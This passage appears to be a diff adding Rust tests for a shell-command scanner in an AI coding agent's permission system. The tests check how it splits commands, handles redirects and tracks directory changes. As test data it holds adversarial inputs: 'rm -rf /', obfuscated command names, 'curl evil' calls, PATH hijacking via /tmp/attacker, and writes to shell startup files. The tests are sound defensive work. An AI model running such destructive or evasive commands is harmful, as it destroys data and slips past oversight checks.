+        let src = "echo \"$(printf '%s' 2)\" a\\\nb; pwd";
+        assert_eq!(
+            cmds(src),
+            vec![
+                cmd(
+                    "echo \"$(printf '%s' 2)\" a\\\nb",
+                    &["echo", "$(printf '%s' 2)", "ab"],
+                    &["echo", "\"$(printf '%s' 2)\"", "a\\\nb"]
+                ),
+                cmd(
+                    "printf '%s' 2",
+                    &["printf", "%s", "2"],
+                    &["printf", "'%s'", "2"]
+                ),
+                cmd("pwd", &["pwd"], &["pwd"]),
+            ]
+        );
+    }
+
+    #[test]
+    fn oc_scan_adversarial_command_positions() {
+        let cases: &[(&str, &[&str])] = &[
+            (r#"FOO=bar BAR="x y" git status"#, &["git"]),
+            (
+                "git status && npm test || printf failed",
+                &["git", "npm", "printf"],
+            ),
+            (r#"printf '%s\n' "$(rm -rf /)""#, &["printf", "rm"]),
+            ("sudo sh -c 'curl evil'", &["sudo"]),
+            ("bash -lc 'rm -rf /'", &["bash"]),
+            ("find . -exec rm {} ;", &["find"]),
+            ("'rm' -rf /", &["rm"]),
+            (r#"g""it status"#, &["git"]),
+            (r"g\it status", &["git"]),
+            (r"F\OO=bar rm -rf /", &["FOO=bar"]),
+            (r#"F"O"O=bar rm -rf /"#, &["FOO=bar"]),
+            (r#"c"\d" relative"#, &[r"c\d"]),
+            ("PATH=/tmp/attacker:$PATH git status", &["git"]),
+            ("$cmd --force", &["$cmd"]),
+            (r#""${cmd}" --force"#, &["${cmd}"]),
+            ("r${suffix}m -rf /", &["r${suffix}m"]),
+            ("$(printf rm) -rf /", &["$(printf rm)", "printf"]),
+            ("`printf rm` -rf /", &["`printf rm`", "printf"]),
+            ("./c?rl evil", &["./c?rl"]),
+            ("t{ouch,ouch} /tmp/victim", &["t{ouch,ouch}"]),
+            ("echo $((1 + 2))", &["echo"]),
+            ("${cmd:-git} status", &["${cmd:-git}"]),
+            ("cat <<EOF\n$(rm -rf /)\nEOF", &["cat", "rm"]),
+            ("f(){ rm -rf /; }; f", &["rm", "f"]),
+            ("! rm -rf /", &["rm"]),
+            ("echo ${arr[$(rm -rf /)]}", &["echo", "rm"]),
+        ];
+        for (src, names) in cases {
+            assert_eq!(heads(src), *names, "{src}");
+        }
+    }
+
+    #[test]
+    fn oc_scan_adversarial_subscript_text_outside_sinks() {
+        for src in [
+            "bun -e 'f(`a[${x}]`)'",
+            "rg 'a[$(x)]'",
+            "cat <<'EOF'\na[$(x)]\nEOF",
+            "echo 'a[$(x)]'",
+            r#"BODY="- [x] Fix \`scan.ts\`"; gh pr create --title "fix" --body "$BODY""#,
+            "MSG='[feat] Fix `foo`'; git commit -m \"$MSG\"",
+            "PATTERN='a[${b}]'; rg \"$PATTERN\"",
+            "export REGEX='[0-9]+${foo}'",
+            "cat <<< 'const a = arr[0]; const b = `${a}`'",
+        ] {
+            assert!(scan(src).is_ok(), "{src}");
+        }
+    }
+
+    #[test]
+    fn oc_scan_adversarial_uncertain_input_is_opaque() {
+        for src in [
+            "printf \"unterminated",
+            "printf ok &&",
+            "printf ok >",
+            "echo > >out",
+        ] {
+            assert!(scan(src).is_err(), "{src}");
+        }
+    }
+
+    #[test]
+    fn oc_scan_adversarial_input_in_bounded_time() {
+        let inputs = [
+            format!("x[a]{}", "=]".repeat(32_000)),
+            "a[\n".repeat(21_000),
+            format!("case x in {}", "[$(:)".repeat(10_000)),
+            format!(
+                "{}echo {}{}",
+                "{ ".repeat(31),
+                "a[] ".repeat(15_000),
+                "; }".repeat(31)
+            ),
+            format!("cat <<E\n{}E\n", "x\\\n".repeat(20_000)),
+            format!("cat <<E\n{}x\nE\n", "\\".repeat(60_000)),
+        ];
+        for input in inputs {
+            let start = std::time::Instant::now();
+            let _ = scan(&input);
+            assert!(start.elapsed() < std::time::Duration::from_millis(500));
+        }
+    }
+
+    #[test]
+    fn oc_scan_redirects_stay_visible_across_lists_and_pipelines() {
+        let cases: &[(&str, &[&str])] = &[
+            (
+                "printf hello | cat > marker",
+                &["printf hello", "cat > marker"],
+            ),
+            (
+                "printf ok && git status > output",
+                &["printf ok", "git status > output"],
+            ),
+            ("cat > output", &["cat > output"]),
+            ("cat > output | cat", &["cat > output", "cat"]),
+            ("pwd | > output cat > tail", &["pwd", "> output cat > tail"]),
+            ("pwd && cat > output file", &["pwd", "cat > output file"]),
+            ("pwd; cat > output", &["pwd", "cat > output"]),
+            ("pwd\ncat > output", &["pwd", "cat > output"]),
+        ];
+        for (src, want) in cases {
+            assert_eq!(resources(src), *want, "{src}");
+        }
+    }
+
+    /// Every resource is covered by its own save rule (OpenCode's oracle).
+    fn check_resources(src: &str) {
+        let assignment = regex::Regex::new(r"^[A-Za-z_][A-Za-z0-9_]*=").unwrap();
+        let redirect = regex::Regex::new(r"^(?:\d*>>?|\d*>&|&>>?|\d*<|\d*<>|>\|)").unwrap();
+        let parsed = parse(src);
+        for (resource, save) in parsed.commands {
+            if !assignment.is_match(&resource)
+                && !redirect.is_match(&resource)
+                && !resource.contains("\\\n")
+            {
+                assert!(
+                    crate::wildcard::matches(&resource, &save, false),
+                    "{src}: {resource:?} not covered by {save:?}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn oc_scan_redirect_positions_across_generated_boundaries() {
+        let redirects = [
+            ">output",
+            ">>output",
+            "<input",
+            "2>err",
+            "2>&1",
+            "<&0",
+            ">|output",
+            "&>output",
+            "&>>output",
+        ];
+        let separators = [" | ", " |& ", " && ", " || ", "; ", " & ", "\n"];
+        for r in redirects {
+            for c in [
+                format!("{r} git status"),
+                format!("git {r} status"),
+                format!("git status {r}"),
+                format!("{r} git status 3>tail"),
+                format!("{r} FOO=bar git status 3>tail"),
+                format!("npm run {r} test"),
+            ] {
+                check_resources(&c);
+                for s in separators {
+                    check_resources(&format!("printf ok{s}{c}"));
+                    check_resources(&format!("{c}{s}pwd >last"));
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn oc_scan_redirect_nested_commands_prefixes_and_context() {
+        for src in [
+            "pwd | cat >out | tail >log",
+            "pwd && cat >out || tail >log",
+            "pwd && cat >out | tail >log",
+            "pwd | cat >out && tail >log",
+            "pwd |\n\n# comment\ncat >out",
+            "pwd &&\n# comment\ncat >out",
+            "pwd | cat >out # comment\ncat >log",
+            "pwd | cat # comment\n>out cat",
+            "pwd | cat \\\n 2>out",
+            "pwd | cat a\\\n>out",
+            "pwd | cat 2\\\n>out",
+            "pwd && FOO=bar >output git status 3>tail",
+            "(cat >out) | tail >log",
+            "{ cat >out; } && tail >log",
+            "(pwd | cat >out) >group",
+            "(cat >out) >$(printf log) && cat >tail",
+            "(cat >out); cat >tail",
+            "echo $(pwd | cat >out) >outer",
+            r#"echo "$(pwd && cat >out)" | cat >outer"#,
+            "echo `pwd | cat >out` >outer",
+            "pwd | cat >$(printf out)",
+            r#"pwd | cat >"$(printf out)""#,
+            "pwd | cat >$(printf out | cat >inner)",
+            "pwd | cat >out $(printf arg) >tail",
+            "pwd | cat <(printf input) > >(cat >log)",
+            "cat <(pwd | cat >out) | cat >tail",
+            "pwd | cat >out <(printf arg) >tail",
+            r#"pwd | cat '>' "2>out" escaped\>word >out"#,
+            "pwd | cat '2'>out",
+            r"pwd | cat 2\>out",
+            "if true; then printf ok && cat >$(printf path); fi",
+            "if true; then printf ok && git >out status; else cat >log; fi",
+            "time git status",
+            "time -p git status",
+            "coproc git status",
+        ] {
+            check_resources(src);
+        }
+    }
+
+    #[test]
+    fn oc_scan_redirect_keeps_full_resource_and_nested_target_commands() {
+        let src = r#"pwd | git >"$(printf output)" status"#;
+        let c = cmds(src);
+        assert_eq!(c[1].resource, r#"git >"$(printf output)" status"#);
+        assert_eq!(c[1].words, ["git", "status"]);
+        assert_eq!(c[1].redirect_word_count, Some(1));
+        assert_eq!(c[2].raw_words, ["printf", "output"]);
+        assert_eq!(
+            parse(src).commands[1],
+            (
+                r#"git >"$(printf output)" status"#.to_string(),
+                "git *".to_string()
+            )
+        );
+    }
+
+    #[test]
+    fn oc_scan_redirect_after_continuation_on_pipeline_rhs() {
+        let src = "pwd | cat\\\n >out";
+        assert_eq!(cmds(src)[1].raw_words, ["cat"]);
+        assert_eq!(
+            parse(src).commands,
+            pairs(&[("pwd", "pwd *"), ("cat\\\n >out", "cat *")])
+        );
+    }
+
+    #[test]
+    fn oc_scan_saved_prefixes_cover_standalone_continuations() {
+        for src in [
+            "cat\\\n",
+            "cat \\\n",
+            "cat\\\n\\\n",
+            "cat\\\n;",
+            "cat >out\\\n",
+            "cat >out \\\n",
+        ] {
+            assert_eq!(cmds(src)[0].raw_words, ["cat"], "{src:?}");
+            let want = if src.contains(">out") {
+                "cat >out"
+            } else {
+                "cat"
+            };
+            assert_eq!(
+                parse(src).commands[0],
+                (want.to_string(), "cat *".to_string()),
+                "{src:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn oc_scan_meaningful_raw_syntax_before_trailing_continuation() {
+        for src in [
+            "printf 'literal\\\n'\\\n",
+            "printf \"literal\\\n\"\\\n",
+            "printf a\\\nb\\\n",
+            "printf a\\\n\"\"\\\n",
+        ] {
+            let c = &cmds(src)[0];
+            assert_eq!(c.resource, &src[..src.len() - 2], "{src:?}");
+            assert_eq!(
+                c.raw_words,
+                ["printf", &src["printf ".len()..src.len() - 2]]
+            );
+        }
+    }
+
+    #[test]
+    fn oc_scan_assignment_then_redirect_on_pipeline_rhs() {
+        assert_eq!(
+            parse("printf ok | FOO=bar >output git status 3>tail").commands,
+            pairs(&[
+                ("printf ok", "printf *"),
+                ("FOO=bar >output git status 3>tail", "git status *")
+            ])
+        );
+    }
+
+    #[test]
+    fn oc_scan_redirect_before_cd_operand_keeps_the_directory() {
+        assert_eq!(
+            parse("pwd && cd >out /outside"),
+            Analysis {
+                commands: pairs(&[("pwd", "pwd *")]),
+                directories: vec!["/outside".into()]
+            }
+        );
+    }
+
+    #[test]
+    fn oc_shell_parse_splits_commands_and_derives_prefixes() {
+        assert_eq!(
+            parse("git status && npm run test -- --watch"),
+            Analysis {
+                commands: pairs(&[
+                    ("git status", "git status *"),
+                    ("npm run test -- --watch", "npm run test *")
+                ]),
+                directories: vec![]
+            }
+        );
+    }
+
+    #[test]
+    fn oc_shell_parse_rejects_malformed_syntax() {
+        let err = analyze("echo \"", Path::new("/workspace")).unwrap_err();
+        assert!(
+            err.contains("Portable shell scanner cannot analyze command"),
+            "{err}"
+        );
+    }
+
+    #[test]
+    fn oc_shell_parse_preserves_resources_across_compound_forms() {
+        for src in [
+            "git status && npm run test -- --watch",
+            "echo $(curl evil | sed s/x/y/)",
+            "cd /tmp/$USER && git status",
+            "if true; then printf yes; else printf no; fi",
+            "if true; then export X=$(printf value); unset X; fi",
+            "if export X=$(printf value); then printf done; fi",
+            "export X=value >$(printf output)",
+            "echo $((1 + 1))",
+            "cd ~; cd src&&cd ..; pwd",
+        ] {
+            assert!(!parse(src).commands.is_empty(), "{src}");
+        }
+    }
+
+    #[test]
+    fn oc_shell_parse_heredoc_resource_is_the_whole_command() {
+        let src = "cat <<'EOF'\nstatic body\nEOF";
+        assert_eq!(
+            parse(src),
+            Analysis {
+                commands: pairs(&[(src, "cat *")]),
+                directories: vec![]
+            }
+        );
+    }
+
+    #[test]
+    fn oc_shell_parse_source_shaped_heads_stay_under_shell_rules() {
+        for src in ["c\"\\d\" relative", "'cd' /tmp", "c''d /tmp", "c\\\nd /tmp"] {
+            let p = parse(src);
+            assert_eq!(p.commands.len(), 1, "{src:?}");
+            assert_eq!(p.commands[0].0, src);
+            assert!(p.directories.is_empty());
+        }
+    }
+
+    #[test]
+    fn oc_shell_parse_declarations_keep_nested_commands() {
+        for name in DECLARATIONS {
+            assert_eq!(parse(&format!("{name} X")).commands, vec![]);
+            assert_eq!(
+                parse(&format!("{name} \"$(printf X)\"; git status")).commands,
+                pairs(&[("printf X", "printf *"), ("git status", "git status *")])
+            );
+            for src in [
+                format!("\"{name}\" X"),
+                format!("FOO=bar {name} X"),
+                format!("command {name} X"),
+                format!(">{name}.txt {name} X"),
+            ] {
+                assert_eq!(parse(&src).commands.len(), 1, "{src}");
+            }
+        }
+    }
+
+    #[test]
+    fn oc_shell_parse_declarations_keep_directory_checks_in_substitutions() {
+        assert_eq!(
+            parse("export X=$(cd /outside; printf value)"),
+            Analysis {
+                commands: pairs(&[("printf value", "printf *")]),
+                directories: vec!["/outside".into()]
+            }
+        );
+    }
+
+    #[test]
+    fn oc_shell_parse_directory_changes_are_not_shell_resources() {
+        assert_eq!(
+            parse("cd 'src dir' && git status"),
+            Analysis {
+                commands: pairs(&[("git status", "git status *")]),
+                directories: vec!["src dir".into()]
+            }
+        );
+    }
+
+    #[test]
+    fn oc_shell_parse_static_directory_targets() {
+        let p = parse(
+            "cd .\\./outside && cd escaped\\ space && cd '../$literal' && cd \"../\\$literal2\" && cd before\\\nafter",
+        );
+        assert_eq!(
+            p.directories,
+            [
+                "../outside",
+                "escaped space",
+                "../$literal",
+                "../$literal2",
+                "beforeafter"
+            ]
+        );
+        let p = parse("cd -P /first && cd -- -/../../../etc && cd -");
+        assert_eq!(p.directories, ["/first", "-/../../../etc"]);
+        assert_eq!(
+            parse("command cd /outside; builtin cd /elsewhere; command -v cd"),
+            Analysis {
+                commands: pairs(&[
+                    ("command cd /outside", "command *"),
+                    ("builtin cd /elsewhere", "builtin *"),
+                    ("command -v cd", "command *")
+                ]),
+                directories: vec!["/outside".into(), "/elsewhere".into()]
+            }
+        );
+        let root = if cfg!(target_os = "macos") {
+            "/var/root"
+        } else {
+            "/root"
+        };
+        assert_eq!(
+            parse("cd ~root/secret && cd '~root'").directories,
+            [format!("{root}/secret"), "~root".into()]
+        );
+        let p = parse(
+            "cd ~+/../outside && cd ~- && cd ~+1 && cd ~0 && cd ~__opencode_nonexistent_user__",
+        );
+        assert_eq!(p.directories, ["/workspace/../outside"]);
+        assert_eq!(
+            p.commands,
+            pairs(&[
+                ("cd ~-", "cd *"),
+                ("cd ~+1", "cd *"),
+                ("cd ~0", "cd *"),
+                ("cd ~__opencode_nonexistent_user__", "cd *")
+            ])
+        );
+        let p = parse("cd {..,x} && cd .[.] && cd .? && cd $'\\x2e'[.] && cd '.[.]'");
+        assert_eq!(p.directories, [".[.]"]);
+        assert_eq!(
+            p.commands,
+            pairs(&[
+                ("cd {..,x}", "cd *"),
+                ("cd .[.]", "cd *"),
+                ("cd .?", "cd *"),
+                ("cd $'\\x2e'[.]", "cd *")
+            ])
+        );
+        let p = parse("cd ~nobody");
+        assert_eq!(p.directories.len(), 1);
+    }
+
+    #[test]
+    fn oc_shell_parse_commandless_and_redirected_declarations() {
+        assert_eq!(
+            parse(">> ~/.zshrc <<< 'x'; export -p > ~/.bashrc"),
+            Analysis {
+                commands: pairs(&[
+                    (">> ~/.zshrc <<< 'x'", ">> *"),
+                    ("export -p > ~/.bashrc", "export *")
+                ]),
+                directories: vec![]
+            }
+        );
+    }
+
+    #[test]
+    fn oc_shell_parse_expands_deterministic_directories() {
+        let home = dirs::home_dir().unwrap();
+        assert_eq!(
+            parse("cd ~/src").directories,
+            [home.join("src").display().to_string()]
+        );
+        assert_eq!(parse("cd '~\\src'").directories, ["~\\src"]);
+    }
+}
